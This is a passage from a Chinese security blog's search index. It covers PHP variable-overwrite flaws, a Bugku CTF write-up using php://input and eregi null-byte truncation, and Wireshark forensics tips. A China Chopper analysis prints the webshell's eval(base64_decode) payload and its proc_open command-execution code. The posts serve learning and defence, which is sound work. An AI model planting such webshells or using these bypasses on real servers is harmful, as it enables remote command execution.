&#39;王芳&#39;, &#39;王秀英&#39;, &#39;王静&#39;, &#39;王丽&#39;, &#39;王敏&#39;, &#39;王磊&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 张伟的电话是：14870293148 张秀英的电话是：14326967740 张敏的电话是：17712576838 张丽的电话是：13722348123 张静的电话是：15542304386 参考： https://segmentfault.com/a/1190000018622193?utm_source=tag-newest https://deerchao.cn/tutorials/regex/regex.htm","categories":[{"name":"Python","slug":"Python","permalink":"https://taonn.github.io/categories/Python/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://taonn.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"PHP变量覆盖学习","slug":"PHP变量覆盖学习","date":"2020-10-04T01:08:31.000Z","updated":"2021-03-16T05:27:35.145Z","comments":true,"path":"2020/10/04/PHP变量覆盖学习/","link":"","permalink":"https://taonn.github.io/2020/10/04/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"概述 自定义的参数值替换原有变量值的情况称为变量覆盖漏洞 $$**使用不当，extract()函数使用不当，parse_str()函数使用不当，import_request_variables()**使用不当，开启了全局变量注册等 $$ 导致的变量覆盖 $$这种写法称为可变变量 1234567&lt;?php$a = &#x27;b&#x27;;echo $a;echo &#x27;&lt;hr&gt;&#x27;;$b = &#x27;betao.cn&#x27;;echo $$a; // 首先$a = b; 然后$$a = $b; 因为$b=&#x27;betao.cn&#x27;，所以这里输出&#x27;betao.cn&#x27;?&gt; 使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞 12345678910&lt;?php$a = &#x27;123&#x27;; // 定义变量$a,值为123echo $a; // 输出值foreach ($_GET as $key =&gt; $value) &#123; $&#123;$key&#125; = $value; // 这里就是漏洞产生的原因，重新定义了变量$a的值 // $_GET传入参数a,使$key = a; 那么$&#123;$key&#125; = $a; 然后重新定义值，修改了原有的值&#125;echo &#x27;&lt;hr&gt;&#x27;;echo $a; // 这里就被改变了?&gt; extract()函数使用不当 https://www.runoob.com/php/func-array-extract.html 函数从数组中将变量导入到当前的符号表，即将数组中的键值对注册成函数，使用数组键名作为变量名，使用数组键值作为变量值 从以上说明我们可以看到第一个参数是必须的，会不会导致变量覆盖漏洞由第二个参数决定，该函数有三种情况会覆盖已有变量 123456&lt;?php$a = &#x27;123&#x27;; // 定义变量$a的值为123$b = array(&#x27;a&#x27; =&gt; &#x27;betao.cn&#x27;); // 定义数组extract($b); // 数组键名作为变量名，数组键值作为变量值echo $a; // 输出betao.cn?&gt; 漏洞复现123456789101112&lt;?phpextract($_GET); // GET变量覆盖if(isset($bdctf)) //判断变量bdctf是否存在&#123;$content=trim(file_get_contents($flag)); //file_get_contents—将整个文件读入一个字符串//trim—去除字符串首尾处的空白字符（或者其他字符）if($bdctf==$content) // 这里需要使得$bdctf==$content&#123; echo&#x27;&#123;betao.cn&#125;&#x27;; &#125;else&#123; echo&#x27;这不是蓝盾的密码啊&#x27;; &#125;&#125;?&gt; 代码分析：需要存在$bdctf变量，$bdctf==$content，所以我们定义?bdctf=&amp;flag=拿到flag 其中，因为content读取的是$flag的值(数据流) parse_str()函数 https://www.w3school.com.cn/php/func_string_parse_str.asp 1234567&lt;?php$a = &#x27;aaa&#x27;;echo $a;echo &#x27;&lt;hr&gt;&#x27;;parse_str(&quot;a=betao.cn&quot;); //经过parse_str()函数，重新赋值变量$a=&#x27;betao.cn&#x27;;echo $a;?&gt; import_request_variables()函数 https://www.php.net/manual/zh/function.import-request-variables.php 将 GET／POST／Cookie 变量导入到全局作用域中, types 参数指定需要导入的变量, G代表GET，P代表POST，C代表COOKIE 值得注意的是：import_request_variables()函数函数只能用在 PHP4.1 ~ PHP5.4之间，额外以上三种函数，使用时请格外注意，否则非常容易出现变量覆盖漏洞 漏洞防范extract()函数防御 将extract.php中extract()函数第二个参数修改为extr_skip: parse_str()函数防御 parse_str()函数的防范，只能我们自己添加判断语句 ,例如: import_request_variables()函数防御 此函数是非常危险的函数，在PHP5.5之后已被官方删除！","categories":[{"name":"PHP","slug":"PHP","permalink":"https://taonn.github.io/categories/PHP/"}],"tags":[{"name":"php安全","slug":"php安全","permalink":"https://taonn.github.io/tags/php%E5%AE%89%E5%85%A8/"}]},{"title":"Bugku-CTF never give up","slug":"Bugku-CTF-never-give-up","date":"2020-10-03T07:15:49.000Z","updated":"2021-03-16T05:27:14.232Z","comments":true,"path":"2020/10/03/Bugku-CTF-never-give-up/","link":"","permalink":"https://taonn.github.io/2020/10/03/Bugku-CTF-never-give-up/","excerpt":"","text":"never give up题目链接 F12，发现有个1p.html 访问发现被重定向了Bugku官网，我们burp抓包拦截 1%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E 首先我们将那些百分号，也就是url编码的进行解码，URL解码为 12&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; &lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ&#x3D;&#x3D;--&gt; 解码完了以后，发现还需要url解码 解码后的结果整理了以下，源代码为 1234567891011121314151617181920212223242526272829303132333435&lt;?php// &quot;;if(!$_GET[&#x27;id&#x27;]) // 限制了url非空非零的变量id&#123; header(&#x27;Location: hello.php?id=1&#x27;); exit();&#125;$id=$_GET[&#x27;id&#x27;];$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];// 以上定义三个GET请求的变量if(stripos($a,&#x27;.&#x27;)) // 变量$a 不能含有.&#123; echo &#x27;no no no no no no no&#x27;; return ;&#125;$data = @file_get_contents($a,&#x27;r&#x27;); // 获取数据，来自与$aif($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123;// 判断条件的代码很有意思/* 1. $data弱等于字符串bugku is a nice plateform! 2. $id弱等于整数型0 3. 变量$b的长度大于5 strlen()函数的作用是判断字符串的长度 4. 字符串 1114 要与字符串 111 连接变量 $b 的第一个字符构成的正则表达式匹配 5. $b 的第一个字符不能弱等于整数4*/ require(&quot;f4l2a3g.txt&quot;); // 包含文件 f4l2a3g.txt&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt; 因为暴露了flag文件的地址，我们直接访问http://123.206.87.240:8006/test/f4l2a3g.txt 即可得到flag 但我们需要突破的是判断的那一层，如何绕过 我们接下来分析$a,$b,$id三个变量 PHP弱类型比较首先我们来说以下$id弱类型,代码看懂问题 参考表： https://www.php.net/manual/zh/types.comparisons.php PHP伪协议因为源代码中变量$data是由file_get_contents()函数读取变量$a,所以$a必须为数据流 在这里$a=bugku is a nice plateform!所以我们需要使用伪协议php://来访问输出数据库, 其中 php://input可以访问原始请求数据中的只读流。这里令 $a = php://input ，并且提交的数据流为bugku is a nice plateform! 关于PHP支持的协议详解（参考官网）: https://www.php.net/manual/zh/wrappers.php eregi() 截断漏洞这里是我第一次遇到，所以我才想把这题做个记录。 在PHP中 ereg() 函数或 eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据 GET请求 %00 POST请求 0x00 或者手动修改hex数据为00 源码中待匹配字符串（第二个参数）已确定为 &quot;1114&quot;，正则表达式（第一个参数）由 &quot;111&quot; 连接 $b 的第一个字符组成，若令 substr($b,0,1) = &quot;\\x00&quot;，即满足 &quot;1114&quot; 与 &quot;111&quot;匹配 ，因此在这里，我们假设$b=\\x0012345也就满足以上三个条件！！！ PHP黑魔法： PHP函数黑魔法小总结 | CTF之PHP黑魔法总结 FLAG接下来我们就构造请求来拿flag，注意，因为我们这边是GET请求，所以我们使用url编码的’%00’即可 还有一点要注意 $id只能使用弱类型，不能等于0,虽然判断条件哪里==0,但是被重定向的判断限制了 12345if(!$_GET[&#39;id&#39;]) &#x2F;&#x2F; 限制了url非空非零的变量id&#123; header(&#39;Location: hello.php?id&#x3D;1&#39;); exit();&#125; 如果$id=0 所以我们必须利用弱类型拿下flag,注意，虽然 b=%0012345 实际字符串长度为 8 字节，但在后台脚本读入数据时，会将 URL 编码 %00 转换成 1 字节。所以说，空字符应该在后台脚本的变量中出现，而不是在 URL 查询字符串变量中出现 总结eregi() 截断漏洞/ 学到了学到了!","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://taonn.github.io/tags/CTF/"}]},{"title":"PHP进制相互转换学习","slug":"PHP进制相互转换学习","date":"2020-10-03T07:11:26.000Z","updated":"2021-03-16T05:26:45.435Z","comments":true,"path":"2020/10/03/PHP进制相互转换学习/","link":"","permalink":"https://taonn.github.io/2020/10/03/PHP%E8%BF%9B%E5%88%B6%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"前言 不管是SQL注入，还是CTF的web题，都有涉及16进制转换，所以特此学习以下 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php// 1. 十进制转二进制 decbin()函数echo &quot;12-&gt;十进制转二进制为: &quot;.decbin(12); //输出：1100echo &#x27;&lt;hr&gt;&#x27;;// string decbin(int number)返回一字符串，包含有给定 number 参数的二进制表示。所能转换的最大数值为十进制的 // 2. 十进制转八进制decoct()函数echo &quot;15-&gt;十进制转八进制: &quot;.decoct(15); // 输出: 17echo &#x27;&lt;hr&gt;&#x27;;//string decoct ( int number ) 返回一字符串，包含有给定 number 参数的八进制表示// 3. 十进制转十六进制 dechex() 函数echo &quot;10-&gt;十进制转16进制: &quot;.dechex(10);echo &#x27;&lt;hr&gt;&#x27;;// string dechex ( int number ) 返回一字符串，包含有给定 number 参数的十六进制表示// 1. 二进制转十六进制 bin2hex() 函数echo &quot;1100-&gt;二进制转十六进制为: &quot;.bin2hex(&#x27;1100&#x27;);echo &#x27;&lt;hr&gt;&#x27;;// 2. 二进制转十进制 bindec()函数echo &quot;1100-&gt;二进制转十六进制为: &quot;.bindec(&#x27;1100&#x27;);echo &#x27;&lt;hr&gt;&#x27;;// 3. 八进制转十进制 octdec()函数echo &quot;17-&gt;八进制转十进制: &quot;.octdec(&#x27;17&#x27;);echo &#x27;&lt;hr&gt;&#x27;;// 4. 十六进制转十进制 hexdec()echo &quot;aaa-&gt;十六进制转十进制: &quot;.hexdec(&#x27;aaa&#x27;);echo &quot;&lt;hr&gt;&quot;;// 终极武器.任意进制转换 base_convert(),在此举两个例子echo &quot;520-&gt;十进制转十六进制: &quot;.base_convert(&#x27;520&#x27;, 10, 16); // 十进制转16进制echo &quot;&lt;hr&gt;&quot;;echo &quot;aaa-&gt;十六进制转十进制: &quot;.base_convert(&#x27;aaa&#x27;, 16, 10);?&gt; 12345678910输出：12-&gt;十进制转二进制为: 110015-&gt;十进制转八进制: 1710-&gt;十进制转16进制: a1100-&gt;二进制转十六进制为: 313130301100-&gt;二进制转十六进制为: 1217-&gt;八进制转十进制: 15aaa-&gt;十六进制转十进制: 2730520-&gt;十进制转十六进制: 208aaa-&gt;十六进制转十进制: 2730 总结base_convert() 会用它就完事了","categories":[{"name":"PHP","slug":"PHP","permalink":"https://taonn.github.io/categories/PHP/"}],"tags":[]},{"title":"中国菜刀原理分析","slug":"中国菜刀原理分析","date":"2020-10-03T07:07:09.000Z","updated":"2021-03-16T05:27:07.695Z","comments":true,"path":"2020/10/03/中国菜刀原理分析/","link":"","permalink":"https://taonn.github.io/2020/10/03/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","excerpt":"","text":"中国菜刀-分析以下是刚连接时，发送的POST请求 首先进行三次握手，然后POST请求了tao.php这个木马文件，我这里密码是a，然后我查看访问tao.php的POST请求数据，在数据中发现如下代码 12a=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval/**/.($xx/**/.($yy[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKF9fRklMRV9fKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==# 注： %3D-&gt;url解密-&gt;= 其中a=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);这一串，转码为base64_decode 1QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKF9fRklMRV9fKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw== 上面这段base64加密的解码为 1@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=dirname(__FILE__);$R=&quot;&#123;$D&#125;\\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\\t&quot;;$u=(function_exists(&#x27;posix_getegid&#x27;))?@posix_getpwuid(@posix_geteuid()):&#x27;&#x27;;$usr=($u)?$u[&#x27;name&#x27;]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;;echo(&quot;|&lt;-&quot;);die(); 我们将整个代码进行整理 1234567891011121314151617181920212223242526&lt;?php$xx = base64_decode;$yy = $_POST;z0 = @ini_set(&quot;display_errors&quot;,&quot;0&quot;); # 临时关闭PHP的错误显示功能@set_time_limit(0); # 防止像dir、上传文件大马时超时@set_magic_quotes_runtime(0); # 关闭魔术引号 这东西在4.0以后就不怎么用了echo(&quot;-&gt;|&quot;);;$D=dirname(__FILE__);$R=&quot;&#123;$D&#125;\\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123; foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L) if(is_dir(&quot;&#123;$L&#125;:&quot;)) $R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\\t&quot;;$u=(function_exists(&#x27;posix_getegid&#x27;))?@posix_getpwuid(@posix_geteuid()):&#x27;&#x27;;$usr=($u)?$u[&#x27;name&#x27;]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;echo(&quot;|&lt;-&quot;);die();@eval(base64_decode($_POST[z0]))# 以下是会显信息 z1 = C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\ # 解码后的?&gt;# 上述代码 待研究 注: 我重新连接，重新抓包的时候，发现z1不是回显了，而是之前请求 以下我发现，文件管理中,分为两个参数z0,z1 我在其中还删除了几个文件，QzpcXHBocFN0dWR5XFxQSFBUdXRvcmlhbFxcV1dXXFxpbmRleC5waHA= 以上都是使用文件管理功能 而我的下一步操作就是，使用菜刀连接了虚拟终端，发现了一个新参数z2,但是其中z1是更为明显的象征，其中z0的值也发生了改变 12345678910111213141516171819202122232425&lt;?phpz0 = @ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$m=get_magic_quotes_gpc();$p=base64_decode($m?stripslashes($_POST[&quot;z1&quot;]):$_POST[&quot;z1&quot;]);$s=base64_decode($m?stripslashes($_POST[&quot;z2&quot;]):$_POST[&quot;z2&quot;]);$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); # dirname() 函数返回路径中的目录部分 # $_SERVER[&quot;SCRIPT_FILENAME&quot;] 当前执行脚本的绝对路径/*如果在命令行界面（Command Line Interface, CLI）使用相对路径执行脚本，例如 file.php 或 ../file.php，那么 $_SERVER[&#x27;SCRIPT_FILENAME&#x27;] 将包含用户指定的相对路径。*/$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;# substr() 函数返回字符串的一部分$array=array(array(&quot;pipe&quot;,&quot;r&quot;),array(&quot;pipe&quot;,&quot;w&quot;),array(&quot;pipe&quot;,&quot;w&quot;));$fp=proc_open($r.&quot; 2&gt;&amp;1&quot;,$array,$pipes);$ret=stream_get_contents($pipes[1]);proc_close($fp);print $ret;;echo(&quot;|&lt;-&quot;);die();?&gt; 12Y21k -&gt; cmdY2QgL2QgQzpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXXCZuZXRzdGF0IC1hbiB8IGZpbmQgIkVTVEFCTElTSEVEIiZlY2hvIFtTXSZjZCZlY2hvIFtFXQ== -&gt; cd /d C:\\phpStudy\\PHPTutorial\\WWW\\&amp;netstat -an | find &quot;ESTABLISHED&quot;&amp;echo [S]&amp;cd&amp;echo [E] 没错，我第一条执行的命令就是他连接默认的第一条命令 再往下看，我发现，虚拟终端执行的每一条命令，z1=cmd 总结 文件管理 key : 连接一句话木马 value: 解码为base64_decode z0 -&gt; 木马核心代码 z1 -&gt; 目录信息 虚拟终端 key : 连接一句话木马 value: 解码为base64_decode z0 -&gt; 木马核心代码 z1 -&gt; cmd (windows) 或者 /bin/sh (Linux) z2 -&gt; 执行的命令 有些函数没见过，有时间再更新… 参考链接 http://blog.ernket.top/2019/10/02/zhong-guo-cai-dao-fen-xi/ https://www.cnblogs.com/milantgh/p/4285735.html","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"常用工具","slug":"常用工具","permalink":"https://taonn.github.io/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"Wireshark 实用小技巧","slug":"Wireshark 实用小技巧","date":"2020-10-03T06:58:39.000Z","updated":"2021-03-16T05:26:55.111Z","comments":true,"path":"2020/10/03/Wireshark 实用小技巧/","link":"","permalink":"https://taonn.github.io/2020/10/03/Wireshark%20%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/","excerpt":"","text":"由于比赛数据包一般都比较大，先通过脚本进行下流量清洗会有事半功倍的效果（感觉上kali下wireshark命令行工具tshark以及TCPdump效率更高，因为是命令行的原因，反而更有利于减少干扰，保持专注)。 以下为几点注意事项： 1、wireshark过滤DHCP时直接输入dhcp会报错，应输入bootp 2、利用过滤http，导出http，保存成相应文件。 ​ 3、urldecode解码，解码后z0部分base64解码，PHP代码在线格式化（输入头&lt;?php 点击格式化即可）​ 4、一般先url解码，再载base64解码​ 5、攻击行为特征 大量404 目录扫描 select … from 等关键词 sql注入 POST请求 用户名和密码——爆破 /../../.. 测试文件包含 echo等 命令执行 http、POST、”@eval“ 一句话木马特征 内网环境，因此攻击者一般为外网ip，被攻击者为内网 最后一条login信息，中提交的用户名密码，且下一次访问换了目录，一般为攻击者成功破解并登录 关键字 过滤多个关键字：ip.addr == 攻击者IP and http.request.uri matches “edit|upload|login| modify “ 文件修改关键字：edit/upload/modify 登录关键字: admin/login/manage 菜刀 查看菜刀连接地址在上一层传输层 ctrl+shift+n追踪到下一条 注：如果是明文说明是下载文件；base64编码则是读取文件内容 ftp过滤语句：ftp-data or ftp 追踪流显示 意义 STOR 上传命令 DELE 删除 CWD 请求目录 LIST 列出目录内容 应急响应浅析windows 名称 描述 工具来源 cmd 命令模式 win自带 net 网络管理命令 win自带 netstat 网络连接状态命令 win自带 ipconfig ip状态参数 win自带 regedit 注册表编辑器 win自带 secpol.msc 本地安全策略 win自带 gpedit.msc 本地安全组策略 win自带 lusrmgr.msc 用户管理器 win自带 eventvwr.msc 事件查看器 win自带 msinfo32 系统信息 win自带 services.msc 服务列表 win自带 at 计划任务 win自带 systeminfo 系统信息 win自带 md5sum md5校验和检测 GNU Windows tool fport 进程对应端口显示 Foundstone, inc Psfile 列举打开文件系统 Sysintemals Pskill 杀进程命令 Sysintemals sc 服务列举工具 资源工具箱 Linux 名称 描述 来源 ps 查看系统进程 /usr/bin/ps ls 查看目录，文件列表 /usr/bin/ls df 查看磁盘空间使用情况 /usr/bin/df netstat 查看网络连接/端口状态 /usr/bin/netstat find 查找文件 /usr/bin/find more 分页显示输出信息 /usr/bin/more chkrootkit 检测常见的rootkit sunfreeware lsof 检测文件和进程/端口关联 sunfreeware md5 文件校验和 sunfreeware nc 网络工具 sunfreeware tcpdump sniffer 自行下载 nmap 端口扫描 自行下载 john 检测口令强度 自行下载 wireshark 过滤规则过滤MAC地址 过滤语句 解释 eth.addr == 00:00:00:00:00:00 过滤目标或源地址是00:00:00:00:00:00 eth.src == 00:00:00:00:00:00 过滤源MAC地址是00:00:00:00:00:00 eth.dst == 00:00:00:00:00:00 过滤目标MAC地址是00:00:00:00:00:00 过滤IP 过滤语句 解释 ip.src == 192.168.1.1 源地址为192.168.1.1 ip.src eq 192.168.1.1 源地址为192.168.1.1 ip.dst == 192.168.1.1 目标地址为192.168.1.1 ip.dst eq 192.168.1.1 目标地址为192.168.1.1 ip.addr == 192.168.1.1 ip地址过滤，不论源还是目标 ip.addr eq 192.168.1.1 ip地址过滤，不论源还是目标 端口过滤 过滤语句 解释 tcp.port == 80 过滤tcp端口80 udp.port eq 80 过滤udp端口80 tcp.srcport == 80 tcp协议的来源端口是80 tcp.dstport == 80 tcp协议的目标端口是80 tcp.port &gt;=1 and tcp.port &lt;= 80 端口范围过滤: 1&lt;= tcp协议端口 &lt;=80 常见协议过滤 过滤协议 tcp udp arp icmp http smtp ftp dns msnms ip ssl telnet oicq bootp … 排除协议包: !arp 或者 not arp http模式过滤 过滤语句 解释 http.request.method == “GET” 只显示GET请求 http.request.method == “POST” 只显示POST请求 http.request.uri == “/login.php” 显示请求URL中有login.php http contains “GET” http contains “HTTP/1.1” 请求头 过滤语句 请求头（GET） http.request.method == “GET” &amp;&amp; http contains “Host:” http.request.method == “GET” &amp;&amp; http contains “User-Agent:” 请求头（POST） http.request.method == “POST” &amp;&amp; http contains “Host:” http.request.method == “POST” &amp;&amp; http contains “User-Agent:” 响应包 http contains “HTTP/1.1 200 OK” &amp;&amp; http contains “Content-Type:” http contains “HTTP/1.0 200 OK” &amp;&amp; http contains “Content-Type:” 运算符 原意 简写 解释 less than lt 小于 less and qeual le 小于等于 equal eq 等于 great then gt 大于 great and equal ge 大于等于 not equal ne 不等于 TCP过滤 过滤语句 解释 tcp.flags 显示包含TCP标志的封包 tcp.flags.syn == 0x02 显示包含TCP SYN标志的封包 tcp.window_size == 0 &amp;&amp; tcp.flags.reset != 1 tcp.flags.reset == 1 RST/ACK 数据包 注: 以上为 显示过滤器 最后，附上一张wireshark思维导图 参考链接 https://blog.csdn.net/y7u8t6/article/details/86511338 https://www.jianshu.com/p/63f6f7d5deed https://www.jianshu.com/p/bbd2ffe57aeb","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Wireshark","slug":"Wireshark","permalink":"https://taonn.github.io/tags/Wireshark/"},{"name":"常用工具","slug":"常用工具","permalink":"https://taonn.github.io/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"南邮CTF-CG Web题writeup详解","slug":"南邮CTF-CG Web题writeup详解","date":"2020-09-26T07:02:59.000Z","updated":"2021-03-16T05:26:37.854Z","comments":true,"path":"2020/09/26/南邮CTF-CG Web题writeup详解/","link":"","permalink":"https://taonn.github.io/2020/09/26/%E5%8D%97%E9%82%AECTF-CG%20Web%E9%A2%98writeup%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"签到题题目链接 1F12 # 查看源代码 md5 collision题目链接 源代码： 12345678910$md51 = md5(&#x27;QNKCDZO&#x27;);$a = 